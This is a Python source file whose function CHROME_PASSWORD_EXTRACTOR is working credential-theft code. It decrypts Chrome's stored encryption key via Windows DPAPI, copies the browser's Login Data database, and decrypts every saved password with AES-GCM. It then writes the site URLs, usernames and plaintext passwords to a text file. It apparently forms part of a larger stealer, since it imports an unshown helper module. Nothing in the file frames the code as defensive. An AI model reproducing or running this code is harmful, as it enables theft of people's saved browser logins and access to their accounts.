import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
import forall

def CHROME_PASSWORD_EXTRACTOR(profile="Default", savefname="chromePass_default"):
    def get_chrome_datetime(chromedate):
        """Return a `datetime.datetime` object from a chrome format datetime
        Since `chromedate` is formatted as the number of microseconds since January, 1601"""
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

    def get_encryption_key():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        # decode the encryption key from Base64
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # remove DPAPI str
        key = key[5:]
        # return decrypted key that was originally encrypted
        # using a session key derived from current user's logon credentials
        # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(password, key):
        try:
            # get the initialization vector
            iv = password[3:15]
            password = password[15:]
            # generate cipher
            cipher = AES.new(key, AES.MODE_GCM, iv)
            # decrypt password
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                # not supported
                return ""

    def main():

        try:
            os.mkdir(forall.USER_NAME())
        except Exception as e:
            print("Error: ", e)
        
        filenametxt = f"{forall.USER_NAME()}\\{savefname}.txt"
        try:
            if os.path.isfile(filenametxt) == True:
                pass
            else:
                try:
                    filem = open(filenametxt, "w", encoding="utf-8")
                    filem.write(f"{datetime.now()} - File Created")
                    filem.close()
                except Exception as e:
                    print("Error: ", e)
                try:
                    with open(filenametxt, "w", encoding="utf-8") as fuck:
                        fuck.write(f"{datetime.now()} - File Created")
                except Exception as e:
                    print("Error: ", e)

            file = open(filenametxt, "r+", encoding="utf-8")
            file.write(f"{datetime.now()} - Starting program\n")
        except Exception as e:
            print("Error: ", e)
        
        # get the AES key
        key = get_encryption_key()
        # local sqlite Chrome database path
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                "Google", "Chrome", "User Data", profile, "Login Data")
        # copy the file to another location
        filename = f"{forall.USER_NAME()}\\{savefname}.db"

        # as the database will be locked if chrome is currently running
        shutil.copyfile(db_path, filename)
        # connect to the database
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        # `logins` table has the data we need
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        # iterate over all rows
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]        
            if username or password:
                print(f"Origin URL: {origin_url}")
                file.write(f"\nOrigin URL: {origin_url}")
                print(f"Action URL: {action_url}")
                file.write(f"\nAction URL: {action_url}")
                print(f"Username: {username}")
                file.write(f"\nUsername: {username}")
                print(f"Password: {password}")
                file.write(f"\nPassword: {password}")
            else:
                continue
            if date_created != 86400000000 and date_created:
                print(f"Creation date: {str(get_chrome_datetime(date_created))}")
                file.write(f"\nCreation date: {str(get_chrome_datetime(date_created))}")
            if date_last_used != 86400000000 and date_last_used:
                print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
                file.write(f"\nLast Used: {str(get_chrome_datetime(date_last_used))}")
            print("="*50)
            file.write("\n\n==================================================\n")

            
 
        cursor.close()
        db.close()
        file.close()
        try:
            # try to remove the copied db file
            # os.remove(filename)
            print("Files Created Successfully!")
        except:
            pass
    try:
        main()
    except Exception as e:
        print("Error: ", e)


# CHROME_PASSWORD_EXTRACTOR(profile="Default", savefname="chrome_pass_default")
